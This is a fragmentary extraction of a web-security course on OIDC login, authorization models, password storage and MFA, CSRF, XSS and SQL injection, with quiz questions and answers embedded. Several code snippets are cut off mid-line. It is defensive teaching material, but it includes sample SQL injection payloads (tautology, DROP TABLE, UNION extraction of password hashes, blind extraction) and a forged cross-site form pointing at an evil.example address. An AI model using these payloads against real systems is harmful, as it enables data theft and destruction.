x: The one flow to know. It works for server-side web apps, SPAs and mobile apps. title OIDC authorization code flow with PKCE intro Every step has a validation that attackers test. Step through them. actors label User's browser label Your app label Identity provider steps label click 'Sign in' title Initiate detail The app generates: a random `state` (CSRF protection for the callback), a random `nonce` (binds the ID token to this request), and a PKCE `code_verifier` (random 43–128 chars) with `code_challenge = base64url(sha256(verifier))`. It stores state, nonce and verifier in the user's pre-login session. label 302 → idp/authorize?response_type=code&client_id&redirect_uri&scope=openid profile email&state&nonce&code_challenge&code_challenge_method=S256 title Redirect to the IdP detail The redirect_uri must exactly match one pre-registered at the IdP. The browser is sent to the IdP; your app never sees the password. label authenticate (password, MFA, passkey, corporate SSO) title User authenticates at the IdP detail The IdP applies its policies: MFA, device checks, conditional access. For enterprise clients, this is *their* policy, which is the point of federation. The IdP may show a consent screen for the requested scopes. label 302 → app/callback?code=…&state=… title Authorization code returned detail A short-lived (≤ 60 s), single-use code is delivered via the browser to the registered redirect URI. Because it travels through the browser, it is exposed to the user agent and

- Implicit flow ( response type=token ): tokens delivered in the URL fragment. Leaks tokens via history and referrers; no client authentication. Deprecated; use authorization code with PKCE for SPAs. - Resource owner password credentials : the app collects the user's IdP password and exchanges it directly. Defeats the purpose (the app sees the password; no MFA or federation). Removed in OAuth 2.1. - Client credentials is fine, but only for machine-to-machine access with no user involved (chapter 18).

Practical steps for an application supporting enterprise SSO: 1. Use a maintained library for the client side (authlib for Python, openid-client for Node, framework integrations). Do not hand-roll token validation. 2. Use discovery : fetch /.well-known/openid-configuration for endpoints and JWKS; cache; refresh on key rotation. 3. Register redirect URIs exactly (no wildcards). One per environment. 4. Per-tenant IdP configuration : enterprise SaaS stores issuer, client ID, client secret (in the secrets manager) and role mappings per tenant. Route users to their tenant's IdP by email domain or a tenant-specific login URL. Validate that the iss in the returned token is the one configured for that tenant. 5. Just-in-time provisioning : create the local user on first login with the IdP's claims, or require pre-provisioning via SCIM (chapter below). 6. Role mapping : map IdP groups ( groups claim, or a custom claim) to application roles; re-evaluate on every login and, if roles can change mid-session, periodically. Default to the least privileged role when no mapping matches. 7. Offboarding : a user removed at the IdP must lose access. With JIT provisioning, this happens at their next login attempt only; to be prompt, implement SCIM (System for Cross-domain Identity Management), which lets the IdP push user create/update/deactivate events to your app, or at minimum short sessions plus periodic revalidation. 8. Account linking : a user with a local password who later arrives via SSO

- Amazon Cognito : user pools as an IdP with federation to social and SAML/OIDC providers; cheap; integrates with ALB authentication and API Gateway. Rough edges in customisation. - Okta, Auth0, Entra ID (Azure AD), Google Workspace, Ping, OneLogin : enterprise IdPs your clients already run. Your job is usually to be a relying party to these. - Keycloak : open-source IdP you can self-host; useful for on-premises or air-gapped client environments. - ALB authentication : an ALB can perform the OIDC flow itself and pass identity headers to targets ( x-amzn-oidc-data ); convenient for internal tools, with the caveat that the backend must verify the ALB's JWT signature and only accept it from the ALB.

Older enterprises run SAML 2.0 rather than OIDC. Concepts map: the IdP, the service provider (you), assertions (XML documents signed by the IdP containing the user's identity and attributes), the browser-redirect binding. Dangers: XML signature wrapping attacks and comment-injection bugs in parsers; use a maintained library (python3-saml, passport-saml, or let your IdP broker handle SAML and present OIDC to your app, which Cognito, Auth0 and Keycloak all do). Validate the assertion signature, the audience, the recipient, the time window and the InResponseTo when using SP-initiated flows. Metadata exchange (XML files) and certificate rotation are the operational chores.

# OIDC relying party checklist - Authorization code flow with PKCE (S256); no implicit, no password grant. - Exact redirect URI registration per environment; HTTPS only. - Random state and nonce stored server-side and verified on callback. - ID token: signature via discovered JWKS, iss, aud == client_id, exp, nonce, azp if present. - Users keyed by (iss, sub), never by email alone; email_verified respected. - Client secrets in a secrets manager; rotated; none in frontend code. - Access tokens treated as opaque by the client; sent only to the intended resource server. - Own session established after login; tokens not stored in localStorage. - Role mapping with least-privilege default; re-evaluated at login. - Offboarding: SCIM or short sessions with revalidation; IdP-side deactivation tested end to end. - Account linking only after ownership verification. - Logout clears the local session; RP-initiated logout if single logout required.

- Missing state check (login CSRF, code injection). - Missing nonce or aud validation on the ID token. - Wildcard or loosely matched redirect URIs (open redirect → code theft). - Keying users by email and trusting unverified emails from the IdP. - Storing tokens in localStorage. - Using the implicit flow for SPAs. - Treating the IdP's access token as proof of identity for your API (it is for the IdP's APIs; use the ID token for identity and issue your own session or tokens). - Not handling offboarding; departed employees retain access via long sessions. - SAML libraries that are unmaintained or hand-written XML parsing. questions What does PKCE protect against? options Password theft at the IdP Interception of the authorization code: a stolen code cannot be exchanged without the code_verifier Expired tokens answer explain The challenge sent in the authorize request binds the later token exchange to the original client. Which ID token claim binds the token to the specific login request that started the flow? options nonce answer explain The nonce stored in the pre-login session must match; otherwise a token from another flow could be injected. Why should local user accounts be keyed by (iss, sub) rather than email? options Emails are too long Emails can change or be reassigned, and some IdPs do not verify them; sub is the stable, issuer-scoped identifier sub is encrypted OIDC requires it answer explain Email-keyed linking has enabled account takeovers across many applications.

Test that a token from tenant A's IdP cannot log into tenant B. 3. Implement a SCIM /Users endpoint (create, update, deactivate) and test deactivation ends access promptly.

x: - Design a permission model that starts simple and survives growth: roles, permissions, scopes, ownership, tenancy. - Implement authorization as a central, testable policy layer with default deny. - Prevent insecure direct object reference (IDOR), the most common access-control vulnerability. - Evaluate policy engines (OPA, Cedar, Casbin, OpenFGA) and know when a library beats hand-written checks. ::: Chapter 3; Part III chapter 15. :::

t: Authorization Models: RBAC, ABAC and Resource-Level Access
x: Authorization logic is scattered by default: an if user.is admin here, a WHERE owner id = ? there, a role check in a decorator somewhere else. Each new endpoint is a chance to forget one. The result is OWASP's top category, Broken Access Control, and its most frequent form, idor: a user changes an ID in a URL and reads someone else's data. The fix is structural: one policy layer, one way to ask "may this principal do this action on this resource?", applied to every request, with default deny and tests.

t: Authorization Models: RBAC, ABAC and Resource-Level Access
Authorization Models: RBAC, ABAC and Resource-Level Access
x: Principals have roles ( admin , manager , member , support ); roles have permissions ( orders:read , orders:cancel , users:invite ). Authorization asks whether any of the principal's roles grants the permission. Simple to reason about, easy to audit ("who can cancel orders?"), coarse: it cannot express "only your orders" without a second mechanism. Design tips: define permissions as the vocabulary ( resource:action ), roles as bundles of permissions, and assign roles to principals within a scope (tenant, project): "Ana is admin of tenant 7 and member of tenant 9." Avoid role explosion by keeping roles few and permissions granular.

t: Authorization Models: RBAC, ABAC and Resource-Level Access
x: Rules over attributes: principal attributes (tenant, department, clearance), resource attributes (owner, tenant, status, classification), action, environment (time, IP, MFA freshness). "A member may cancel an order if the order's tenant is the member's tenant, the member owns the order, and the order's status is pending." Expressive; harder to audit ("who can do X?" requires evaluating rules over data); essential for ownership and state-based rules.

t: Authorization Models: RBAC, ABAC and Resource-Level Access
x: Permissions derived from relationships in a graph: document → folder → team → user. "Anyone who is a viewer of a parent folder can view the document." Google's Zanzibar model; implemented by OpenFGA, SpiceDB, Ory Keto. Powerful for collaboration products with sharing and hierarchy; introduces a new service to run.

t: Authorization Models: RBAC, ABAC and Resource-Level Access
x: Most applications need RBAC for coarse capability plus ABAC for ownership, tenancy and state : "Does the principal have orders:cancel in this tenant? Is this order in this tenant? Does the principal own it or hold a role that bypasses ownership? Is the order cancellable?" Start there; adopt ReBAC when sharing hierarchies become the product.

Resource is the loaded object (tenant-scoped).""" # 1. Tenant boundary: no cross-tenant access, ever. if getattr(resource, "tenant_id", None) != p.tenant_id: raise Denied("cross-tenant") # 2. Capability: does any role grant the action? if not any(action in ROLE_PERMISSIONS.get(r, set()) for r in p.roles): raise Denied("missing permission") # 3. Ownership / state rules (ABAC) if action is Action.ORDER_CANCEL: is_privileged = p.roles & {"owner", "admin"} if not is_privileged and resource.owner_id != p.id: raise Denied("not owner") if resource.status not in ("pending", "paid"): raise Denied("not cancellable") if action is Action.ORDER_REFUND: if p.mfa_age_s is None or p.mfa_age_s > 600: raise Denie

t: Authorization Models: RBAC, ABAC and Resource-Level Access
x: 1. Load by (tenant id, id) , never by id alone, in every repository method. 2. Authorise against the loaded resource before returning or mutating. 3. Use unguessable IDs (UUIDv7, random slugs) so enumeration is impractical; this is defence in depth, not the control. 4. Apply the same discipline to sub-resources and indirect references: /orders/123/invoice.pdf , /attachments/9f3a , ?export id= , batch endpoints that take lists of IDs (check every ID), and background jobs that receive IDs. 5. Return 404 for resources outside the caller's scope when existence is sensitive; 403 when the resource is known to exist for the caller but the action is not allowed. 6. Test horizontally: for each endpoint, as user B, request user A's resource IDs.

t: Authorization Models: RBAC, ABAC and Resource-Level Access
x: OAuth scopes and API-key scopes limit what a credential may do, independently of what the user may do. The effective permission is the intersection: a token with orders:read held by an admin may only read orders. Implement scopes as an additional check in the policy layer ( action in token.scopes ), and issue tokens with the minimum scopes a client needs.

t: Authorization Models: RBAC, ABAC and Resource-Level Access
x: When rules multiply, externalising them helps: - Open Policy Agent (OPA) with the Rego language: a general-purpose policy engine, used for Kubernetes admission, API authorization, infrastructure policy. Decisions via a local sidecar or library. - Cedar (AWS, used by Amazon Verified Permissions): a readable policy language with formal verification properties; good for application authorization with a managed option. - Casbin : library-embedded, model + policy files, many languages; good for RBAC/ABAC inside the app. - OpenFGA / SpiceDB : ReBAC services for relationship-heavy products. Benefits: policies as data, reviewable and testable separately, consistent across services. Costs: another language to learn, latency if remote, and the temptation to put resource-loading logic into the engine. For a single application with a handful of rules, a well-structured in-code policy module is usually better; adopt an engine when many services must agree or when the product's sharing model is a graph.

x: Expose role assignments as data with an admin UI and an API; record who changed whose roles and when; review access periodically (quarterly for enterprise clients); support "least privilege by default" on invite; and give tenants' own admins self-service so your support team is not the bottleneck (and not a privileged path into every tenant). Log every denial with principal, action and resource; spikes indicate probing.

- Store passwords so that a database breach does not yield usable credentials: Argon2id or bcrypt, correctly parameterised. - Implement password policy, breach checking, rate limiting and recovery flows that resist the attacks seen in practice. - Add TOTP and WebAuthn/passkeys as second (or primary) factors, with safe enrolment and recovery. - Avoid the account-recovery weaknesses that undo everything else. ::: Chapters 4 and 16 (hashing concepts are summarised here; chapter 16 goes deeper). :::

Databases leak. When yours does, the password table decides whether the incident is "rotate some secrets" or "every user's credentials, reused on their bank, are in an attacker's hands". Meanwhile, attackers do not usually crack passwords at all; they stuff credentials leaked from other sites, phish users, and abuse account recovery . Password storage, rate limiting, MFA and recovery design are one system; a weakness in any part is a weakness in all.

Never store passwords, encrypted or otherwise. Store a slow, salted hash computed by a function designed for passwords: - Argon2id (winner of the Password Hashing Competition): memory-hard, resists GPU and ASIC attacks. Current recommendation: memory 64 MB ( m=65536 ), 3 iterations, parallelism 4 (or 19 MB with 2 iterations for constrained systems; OWASP publishes current minimums). Tune so one verification costs about 50–200 ms on your servers. - bcrypt : older, widely available, CPU-hard only; cost factor 12–13 today. Truncates input at 72 bytes (pre-hash with SHA-256 if you allow longer passwords, carefully). Acceptable; prefer Argon2id for new systems. - scrypt and PBKDF2 (≥ 600,000 iterations for SHA-256): acceptable where mandated (FIPS environments often require PBKDF2). Never: MD5, SHA-1, SHA-256 alone (fast hashes are brute-forced at billions per second), unsalted anything, home-made schemes, or a "pepper" as a substitute for a slow hash (a pepper, a server-side secret added to the hash input, is a fine addition if stored in a secrets manager, not in the database). value correct horse battery staple # argon2-cffi from argon2 import PasswordHasher, exceptions ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4) # tune to ~100 ms def hash_password(password: str) -> str: return ph.hash(password) # returns "$argon2id$v=19$m=65536,t=3,p=4$<salt>$<hash>" with a random salt def verify_password(stored: str, password: str) -> tuple[bool, str | None]: try: ph.ver

Modern guidance (NIST SP 800-63B): minimum length 8 (12+ for admins), maximum at least 64, allow any printable characters including spaces and Unicode, no composition rules (forced symbols produce Password1! ), no periodic forced rotation (produces predictable increments), check against breached-password lists (Have I Been Pwned's k-anonymity API, or a local corpus) at set time and optionally at login, block the most common passwords and context-specific ones (the company name), and show a strength meter. Encourage password managers: do not disable paste.

Credential stuffing is thousands of username/password pairs tried at machine speed. Defences, layered: per-IP and per-account rate limits (Part III chapter 5); progressive delays after failures; CAPTCHA or proof-of-work after a few failures; device/IP reputation; MFA (which turns a correct stuffed password into nothing). Hard lockout after N failures is a denial-of-service vector (attackers lock out victims); prefer temporary slowdowns and notifications ("new login attempt failed; was this you?"). Monitor failure rates globally; a spike is an attack in progress.

Factors: something you know (password), have (phone, key), are (biometric unlocking a device). MFA adds a second, independent factor. Options from weakest to strongest: Method Phishing-resistant Notes --- --- --- SMS / voice codes No SIM swap, SS7 interception, phishable in real time. Better than nothing; not for admins or high-value accounts. Also costs money and invites "SMS pumping" fraud via unprotected enrolment endpoints. Email codes / magic links No Only as strong as the mailbox; useful as passwordless for low-risk apps. totp (authenticator apps) No (codes can be phished in real time) Cheap, offline, universally supported. Good default second factor. Push notifications with number matching Partially Resists blind approval fatigue; still phishable by sophisticated proxies. WebAuthn / FIDO2: passkeys and security keys Yes Cryptographic challenge bound to the origin; cannot be phished or replayed. The gold standard.

Generate a 160-bit random secret per user; show it as a QR code ( otpauth://totp/App:user?secret=…&issuer=App&digits=6&period=30 ); require the user to enter one valid code before enabling (proves enrolment); store the secret encrypted at rest (KMS or application-level encryption) because it is a credential; accept the current window ±1 step for clock drift; prevent replay by recording the last used time step per user and rejecting codes at or before it; rate-limit verification (a 6-digit code has a million possibilities, brute-forceable in minutes without limits).

The browser and the device's authenticator generate a key pair per site (the relying party ID, your domain). Registration stores the public key and credential ID; authentication signs a server-issued random challenge, which the server verifies with the stored public key, checking the origin, RP ID, challenge, and the signature counter if present. Because the authenticator will only sign for the exact origin, phishing sites get nothing useful. Passkeys are WebAuthn credentials synchronised across a user's devices (iCloud Keychain, Google Password Manager, 1Password), making them practical for consumers; hardware security keys (YubiKey) are the non-synced variant for high assurance. Implementation: use a library ( py webauthn , @simplewebauthn/server ) and the browser's navigator.credentials API; store credential ID, public key, sign count, transports and a user-chosen name per credential; allow multiple credentials per user; support passkeys as a passwordless primary factor where appropriate, with conditional UI (autofill) for a smooth experience. Serve over HTTPS on your real domain (RP ID must match).

Every recovery path is an alternative login. Attackers target it because it is usually weaker than the front door. - Password reset by email : generate a random, single-use, short-lived (15–60 min) token; store only its hash; send a link; on use, require a new password, invalidate the token and all other reset tokens, invalidate all sessions, and notify the user. Rate-limit requests. Respond identically whether the email exists or not. Never include the token in logs or analytics (strip query strings). - MFA recovery : provide single-use backup codes at enrolment (hashed in storage), encourage multiple passkeys/devices, and make the "lost my device" path deliberately slow and verified (delay with notifications to all known channels, identity verification by support with a documented procedure). A recovery path that bypasses MFA with just an email makes MFA decorative. - Security questions : do not. Answers are guessable or public. - Support-assisted recovery : document the procedure, require evidence, log every action, and audit it; social engineering of support staff is a primary attack on high-value accounts. - Email change : confirm on both old and new addresses; the old address is the recovery anchor.

Magic links and passkeys remove passwords entirely. Magic links inherit email's weaknesses and are fine for low-risk consumer apps. Passkeys are the strong option and are now practical for most audiences; offer them as the preferred method with a password or email fallback during transition.

Notify users on new-device logins, password changes, MFA changes and recovery events. Log all of these as audit events. Expire sessions on password change. Periodically rehash to current parameters. Keep an eye on breach notification feeds for your users' domains if you run B2B.

- Fast hashes (SHA-256) or unsalted hashes. - bcrypt with the 72-byte truncation unknown, allowing password… plus garbage to verify. - Forced 90-day rotation and complexity rules. - Unlimited TOTP verification attempts; no replay protection. - SMS as the only MFA, especially for admins. - Reset tokens stored in plaintext, long-lived, or reusable; sessions not invalidated on reset. - MFA bypassable through recovery or support. - TOTP secrets stored in plaintext in the users table. - Different error messages or timings revealing account existence. questions Why is SHA-256 unsuitable for password storage even with a salt? options It is insecure cryptographically It is fast: attackers test billions of guesses per second; password hashes must be deliberately slow and memory-hard It produces too short a hash Salts do not work with SHA answer explain Argon2id, bcrypt and scrypt are designed to make each guess expensive. Which MFA method resists phishing? options SMS codes TOTP apps Push notifications WebAuthn passkeys / security keys answer explain WebAuthn binds the signature to the origin; a phishing site cannot obtain a usable response. A password reset token is valid for 7 days, reusable, and stored in plaintext. Which single change matters most? options Make it 14 days Store only its hash, make it single-use and short-lived, and invalidate sessions on use Send it by SMS too Log it for auditing answer explain Reset tokens are credentials; treat them with the same discipline as p

Implement TOTP enrolment and verification with replay protection and rate limiting; try to replay a code and to brute force one. 3. Add passkey registration and login with a library; register two credentials, delete one, and test login from each.

- Explain how cross-site request forgery works and why cookies make it possible. - Apply the layered defences: SameSite cookies, anti-CSRF tokens, origin verification, and safe method semantics. - Configure cookies for browser applications and APIs so that the common bypasses do not apply. - Test for CSRF and related issues (login CSRF, clickjacking) systematically. ::: Part II chapter 11; chapter 4 of this part. :::

Browsers attach cookies automatically to requests to the matching site, regardless of which page initiated the request. A page on evil.example can make the victim's browser send POST https://bank.example/transfer with the victim's bank cookie attached. The bank sees a well-formed, authenticated request. That is cross-site request forgery: the attacker does not steal the credential; they borrow the browser that holds it.

Without SameSite protection it will be sent on any request to that host from anywhere. label visits a malicious or compromised page title Victim visits the attacker's page detail Via a link in an email, an ad, a forum post, or a compromised legitimate site. label <form action=https://app.client.com/account/email method=POST> + auto-submit title Forged request is constructed detail HTML forms can POST cross-site without JavaScript and without CORS (form submissions are 'simple requests'). The form sets email=attacker@evil.example. A hidden iframe or auto-submit script fires it. label POST /account/email (with victim's cookie) title Browser sends the request with credentials detail The browser attaches the session cookie because the request targets app.client.com. The server sees an authenticated POST from a logged-in user. If it has no CSRF defence, it changes the account email, enabling a password reset takeover. label 200 OK (attacker cannot read it, does not need to) title Damage done detail The same-origin policy stops evil.example from *reading* the response, but CSRF only needs the request to *execute*. That is why CORS does not prevent CSRF. dashed What makes an endpoint vulnerable: it authenticates by cookie (or HTTP Bas

SameSite=Lax (the modern browser default when unspecified, but set it explicitly): the cookie is not sent on cross-site POSTs, iframes, images, or fetches; it is sent on top-level GET navigations (clicking a link to your site). This blocks the classic form-POST attack entirely, as long as your state-changing endpoints are not GET. SameSite=Strict also blocks the cookie on cross-site top-level navigations, which breaks "click a link from email and be logged in" but is appropriate for high-security sessions or a second "sensitive actions" cookie. Limits: Lax does not protect GET endpoints that change state (never have those); some older browsers ignore SameSite; subdomains count as same-site, so an XSS or an attacker-controlled subdomain ( user-content.client.com ) can still forge requests; and SameSite=None cookies (needed for embedded third-party contexts) have no protection. Therefore SameSite is the first layer, not the only one.

The server requires a secret the attacker cannot obtain to accompany every state-changing request. Because the same-origin policy prevents evil.example from reading your pages or responses, a token embedded in your page or readable by your JavaScript is unavailable to the attacker. - Synchroniser token : a random per-session token stored server-side; embedded in forms as a hidden field (and exposed to JavaScript for fetch requests via a meta tag or an endpoint); compared on every POST/PUT/PATCH/DELETE. Frameworks implement this (Django, Rails, Spring Security). - Double-submit cookie : the token is set in a cookie and sent in a header or body; the server checks they match. Stateless. Vulnerable to cookie injection from subdomains unless the token is also signed/HMAC'ed with a server secret and bound to the session (the "signed double-submit" variant). - Custom header requirement for APIs : a request with a custom header ( X-Requested-With , X-CSRF-Token ) cannot be made cross-site without a CORS preflight, which your server will refuse for foreign origins. So an API that only accepts JSON with a custom header, and rejects form content types, is CSRF-resistant for browser clients that follow CORS. This relies on correct CORS configuration (chapter 14) and on rejecting text/plain and form bodies. # Starlette/FastAPI sketch: signed double-submit, bound to the session import hmac, hashlib, secrets def csrf_token_for(session_id: str) -> str: nonce = secrets.token_urlsafe(16) sig =

Browsers send Origin on cross-origin requests (and Referer more generally). Reject state-changing requests whose Origin (or, failing that, Referer ) does not match your own origins. Cheap, effective as a layer; not sufficient alone because some requests lack both headers and some proxies strip them.
GET, HEAD and OPTIONS must never change state. logs the user out; deletes an order; link prefetchers trigger both. This is an HTTP rule (Part II chapter 8) and a CSRF defence at once.

Login CSRF : the attacker logs the victim into the attacker's account (forged login POST with attacker credentials), so the victim's subsequent actions (saving a card, uploading documents) land in the attacker's account. Defence: CSRF-protect the login form too (a pre-login session with a token), and rotate sessions at login. Logout CSRF : an annoyance more than a breach, but protect it anyway. JSON APIs with cookie auth : reject form content types; require a custom header; configure CORS strictly; SameSite cookies. With all three, token-based CSRF protection is often unnecessary, but many teams keep it for defence in depth. Bearer-token APIs : not vulnerable to CSRF (the browser does not attach Authorization headers automatically), but vulnerable to token theft via XSS if tokens are in JavaScript-accessible storage. Pick your poison deliberately: HttpOnly cookies plus CSRF defence, or header tokens plus strict XSS defence. Clickjacking : a related attack where your page is framed invisibly on the attacker's site and the user is tricked into clicking. Defence: Content-Security-Policy: frame-ancestors 'none' (or 'self' ) and the legacy X-Frame-Options: DENY (chapter 15). WebSockets : the handshake carries cookies and is not subject to CORS; verify the Origin header on the handshake (cross-site WebSocket hijacking).

Set-Cookie: __Host-sid=<random>; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=43200 Set-Cookie: __Host-csrf=<token>; Path=/; Secure; SameSite=Strict (double-submit variant; readable by JS, so no HttpOnly) Never set Domain on session cookies; never use SameSite=None on them; never carry session IDs in URLs.

- For each mutating endpoint: craft a cross-site form POST from a different origin (a local HTML file on another port) while logged in. Expect rejection. - Remove the CSRF header from a legitimate fetch; expect 403. - Verify GET endpoints change nothing (grep for handlers on GET that write). - Confirm cookie attributes in responses. - Attempt login CSRF. - Check frame-ancestors with a test page that iframes your app. - Automated scanners (ZAP) detect missing tokens; manual tests catch logic.

- Relying on CORS to prevent CSRF (CORS controls reading, not sending). - State-changing GET endpoints. - SameSite=None on the session cookie to fix an embedded widget. - Double-submit tokens without signing, defeated by subdomain cookie injection. - CSRF tokens checked only on some endpoints (the new one was forgotten). - Login form without CSRF protection. - Accepting text/plain or form bodies on JSON APIs, enabling simple-request CSRF. - Trusting Referer alone. questions Why does CORS not prevent CSRF? options CORS only applies to GET CORS controls whether a page can read a cross-origin response; CSRF only needs the request to be sent and executed CORS is a server-side control It does prevent CSRF answer explain Form submissions and simple requests are sent regardless; the attacker never needs the response. Which cookie attribute blocks the classic cross-site form POST attack? options Secure HttpOnly SameSite=Lax (or Strict) Path=/ answer explain Lax excludes cookies from cross-site POSTs, iframes and fetches. A JSON API authenticates via cookies, accepts only application/json with a required custom header, and has strict CORS. Is it protected against browser-based CSRF? options No; it needs tokens regardless Largely yes: the custom header forces a preflight that foreign origins fail, as long as form and text/plain bodies are rejected Only with SameSite=None Only for GET answer explain Custom headers cannot be sent cross-site without CORS approval. - Explain the three XSS variants (reflected, stored, DOM-based) and the exact mechanism by which attacker-controlled text becomes executing script. - Prevent XSS structurally with context-aware output encoding, safe templating, and framework defaults, and know where frameworks do not protect you. - Deploy Content Security Policy as a backstop that limits what injected script can do. - Review code and test for XSS, including in rich text, SVG, Markdown and URL contexts. ::: Part II chapter 8; chapter 9 of this part. :::

A web page is a program. When your server or client inserts text supplied by a user into that program without making clear "this is data, not code", the browser executes whatever the text says. The attacker's script then runs as the victim , inside your origin: it can read the DOM (including data the victim is viewing), make authenticated requests, steal non-HttpOnly cookies and tokens, rewrite the page to phish, or chain into CSRF-protected actions (because it has the CSRF token). Any site that displays user-supplied content, which is every site, must solve this.

- Reflected : the payload arrives in the request (query string, form field) and is echoed into the response. https://app/search?q= … . Delivered via a crafted link. - Stored : the payload is saved (a comment, a profile name, a support ticket, a filename) and rendered to other users later. Hits everyone who views it, including admins. - DOM-based : the server never sees the payload; client-side JavaScript takes data from a source ( location.hash , postMessage , a fetched JSON field) and writes it into a sink ( innerHTML , document.write , eval , href="javascript:" ). The mechanism is identical: untrusted text is inserted into an HTML, JavaScript, URL or CSS context without the encoding that context requires.

Context Example Required handling --- --- --- HTML body {{ name }} HTML entity encode & " ' (template autoescape) HTML attribute Entity encode, and always quote attributes URL in attribute Validate scheme is http / https /relative (block javascript: , data: ), then URL-encode parameters JavaScript string var n = "{{ name }}"; Avoid entirely; pass data via data- attributes or a JSON block with is safe-ish; inline or direct navigation is not Serve from a separate origin with Content-Disposition: attachment , or sanitise aggressively JSON API responses {"name": " "} Fine as JSON ( Content-Type: application/json , X-Content-Type-Options: nosniff ); the danger is the client's rendering Modern frameworks (React, Vue, Angular, Jinja2 with autoescape, Django templates, Rails ERB) encode HTML body and attribute contexts by default. They do not protect: dangerouslySetInnerHTML / v-html / [innerHTML] , href values with javascript: schemes (React blocks some, not all), templating into , server-side string concatenation, safe / Markup() / raw escapes used on user data, third-party widgets that take HTML, and legacy jQuery .html() calls.

Encoding prevents injection; csp limits the damage when something slips through, by telling the browser which scripts may run. Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-7f3a9c2e' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'; img-src 'self' data: https://cdn.client.com; style-src 'self' 'unsafe-inline'; connect-src 'self' https://api.client.com; report-uri /csp-report With a nonce-based policy, only tags (nonce generated per response) and scripts they load ( strict-dynamic ) execute; an injected or onerror= handler has no nonce and is blocked. This defeats the vast majority of XSS payloads even when encoding fails. Rules: no 'unsafe-inline' for scripts; no 'unsafe-eval' ; avoid host allow-lists for scripts (CDNs host JSONP endpoints that bypass them); start with Content-Security-Policy-Report-Only to find violations, then enforce. SPAs built with modern bundlers support nonces or hashes; inline event handlers must be refactored to addEventListener . Chapter 15 covers the full header set.

- HttpOnly cookies keep session IDs out of script's reach; XSS can still act as the user while the page is open, but cannot exfiltrate the session for later. - Trusted Types ( require-trusted-types-for 'script' in CSP) make DOM sinks reject plain strings in supporting browsers, eliminating DOM XSS classes in new code. - Separate origins for user content (uploads, previews) so that even executing content there cannot reach your application's cookies and DOM. - X-Content-Type-Options: nosniff stops browsers from treating a JSON or text response as HTML. - Input validation helps (a phone number field should not accept < ), but it is not the primary defence: legitimate data often contains special characters ( O'Brien , <3 ), and the same data is rendered in many contexts.

Usernames and display names (rendered in admin panels: stored XSS against admins is the privilege-escalation path), filenames (rendered in lists), error messages that echo input, search result highlighting, email templates rendered as HTML, PDF generation via HTML-to-PDF converters (XSS in the converter can become server-side file read), log viewers displaying raw log lines, Markdown renderers with HTML enabled, postMessage handlers that trust the message, and third-party embeds.

- Explain exactly how SQL injection works and why string building is the root cause. - Use parameterised queries, prepared statements and ORMs correctly, and recognise the cases where they do not help (identifiers, ORDER BY, LIKE, raw fragments, dynamic SQL in stored procedures). - Apply the second-line defences: least-privilege database roles, input validation, error handling, and query monitoring. - Review code and test for injection, including in NoSQL and ORM query languages. ::: Part VIII chapter 1 is helpful; chapter 1 of this part. :::

A query built by concatenating strings lets the data become part of the command. The database cannot tell which parts the developer wrote and which parts the user supplied. SQL injection is more than twenty-five years old, trivially prevented, and still causes major breaches every year because of one f-string in a corner of the codebase.

# Building SQL with string formatting def find_user(db, email: str): return db.execute(f"SELECT id, email, role FROM users WHERE email = '{email}'").fetchone() With email = "' OR 1=1 --" the query becomes: SELECT id, email, role FROM users WHERE email = '' OR 1=1 --' which returns the first user (often an admin). With '; DROP TABLE users; -- on a driver that allows multiple statements, it deletes the table. With ' UNION SELECT id, password hash, 'x' FROM users -- it exfiltrates hashes. Blind variants ( ' AND (SELECT SUBSTR(password hash,1,1) FROM users WHERE role='admin')='a' -- ) extract data one character at a time from responses or timing, which automated tools do in minutes. ::: # Parameterised query: the driver sends the SQL and the values separately def find_user(db, email: str): return db.execute("SELECT id, email, role FROM users WHERE email = %s", (email,)).fetchone() The database receives the statement with a placeholder and the value as a typed parameter. No matter what the string contains, it is a string compared with email . It cannot change the query's structure. ::: Placeholder syntax varies ( %s for psycopg, $1 for asyncpg, ? for sqlite3 and JDBC, :name for named parameters); the principle is identical. The wrong pattern is any of + , % formatting, .format() , f-strings or template literals that put data into SQL text .

SQLAlchemy, Django ORM, Prisma, Knex, ActiveRecord and friends parameterise automatically when you use their APIs: # SQLAlchemy: parameterised stmt = select(User).where(User.email == email) # Django: parameterised User.objects.filter(email=email) They stop protecting you when you drop to raw SQL with formatting: session.execute(text(f"SELECT * FROM users WHERE email = '{email}'")) # raw + f-string User.objects.raw(f"SELECT * FROM users WHERE email = '{email}'") User.objects.extra(where=[f"email = '{email}'"]) prisma.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${email}'`) ::: session.execute(text("SELECT * FROM users WHERE email = :email"), {"email": email}) User.objects.raw("SELECT * FROM users WHERE email = %s", [email]) await prisma.$queryRaw`SELECT * FROM users WHERE email = ${email}` # tagged template: parameterised ::: Lint rules (Semgrep, Bandit, ESLint plugins) catch most raw-SQL-with-interpolation patterns; make them fail the build.

Parameters work for values . They do not work for identifiers (table and column names), keywords ( ASC / DESC ), or structural choices. Dynamic sorting and filtering are where injection survives in "parameterised" codebases: order = request.args.get("sort", "created_at") db.execute(f"SELECT * FROM orders ORDER BY {order}") # sort=id; DROP TABLE orders -- ::: SORTABLE = {"created_at": "created_at", "total": "total", "status": "status"} col = SORTABLE.get(request.args.get("sort", "created_at")) if col is None: raise ValidationFailed("unsupported sort") direction = "DESC" if request.args.get("dir") == "desc" else "ASC" db.execute(f"SELECT * FROM orders WHERE tenant_id = %s ORDER BY {col} {direction}", (tenant_id,)) The identifier comes from an allow-list mapping , never from the input itself; values remain parameters. ::: Other cases: LIKE patterns (parameterise the value and escape % and in it if the user should not control wildcards); IN (...) lists (expand to one placeholder per value, or use array parameters: WHERE id = ANY(%s) in PostgreSQL); table names per tenant (allow-list or quote with the driver's identifier quoting, e.g. psycopg.sql.Identifier ); LIMIT / OFFSET (cast to int and bound); stored procedures that build dynamic SQL internally ( EXECUTE format(...) with %I / %L quoting in PostgreSQL).

